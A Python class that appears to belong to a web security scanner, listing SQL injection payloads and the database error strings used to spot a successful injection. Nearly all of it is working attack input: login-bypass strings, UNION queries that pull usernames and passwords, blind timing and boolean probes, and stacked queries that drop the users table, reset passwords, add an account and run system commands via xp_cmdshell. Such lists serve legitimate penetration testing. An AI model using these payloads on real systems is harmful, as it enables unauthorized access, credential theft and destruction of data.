class SQLiPayloads:
    """
    SQL Injection test payloads for different types of SQL injection attacks.
    """

    ERROR_SIGNATURES = {
        "mysql": [
            "sql syntax",
            "mysql_fetch",
            "mysql_num_rows",
            "warning: mysql",
            "mysqli",
            "mysql error",
            "mysql_",
        ],
        "postgres": [
            "postgresql",
            "pg_query",
            "pg_exec",
            "error: syntax error",
            "pg_",
            "pgsql",
            "postgres error",
        ],
        "mssql": [
            "odbc sql server",
            "sqlserver jdbc driver",
            "msg ",
            "sqlexception",
            "microsoft sql",
            "sql server",
        ],
        "oracle": [
            "ora-",
            "oracle.jdbc",
            "oracle error",
            "oracle database",
            "pl/sql",
        ],
    }

    BASIC_AUTHENTICATION_BYPASS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin'#",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        ") or '1'='1--",
        ") or ('1'='1--",
    ]

    UNION_BASED = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT NULL,version()--",
        "' UNION SELECT NULL,database()--",
    ]

    TIME_BASED_BLIND = [
        "'; WAITFOR DELAY '0:0:5'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "1'; SELECT SLEEP(5)--",
        "'; BENCHMARK(5000000,MD5('test'))--",
        "1' AND SLEEP(5)--",
        "1' OR SLEEP(5)--",
        "'; pg_sleep(5)--",
        "1'; pg_sleep(5)--",
    ]

    BOOLEAN_BASED_BLIND = [
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND SUBSTRING(version(),1,1)='5'--",
        "1' AND ASCII(SUBSTRING(database(),1,1))>97--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND (SELECT LENGTH(database()))>0--",
    ]

    ERROR_BASED = [
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "' AND exp(~(SELECT * FROM (SELECT 1)x))--",
        "' OR 1 GROUP BY CONCAT_WS(0x3a,version(),floor(rand()*2)) HAVING MIN(0)--",
    ]

    STACKED_QUERIES = [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; UPDATE users SET password='hacked'--",
        "'; EXEC xp_cmdshell('whoami')--",
        "'; CREATE TABLE test(id INT)--",
    ]

    COMMENT_VARIATIONS = [
        "admin'--",
        "admin'#",
        "admin'/*",
        "admin'-- -",
        "admin';--",
        "admin';#",
    ]

    @classmethod
    def get_error_signatures(cls) -> dict[str, list[str]]:
        """Return the error signatures for different databases."""
        return cls.ERROR_SIGNATURES

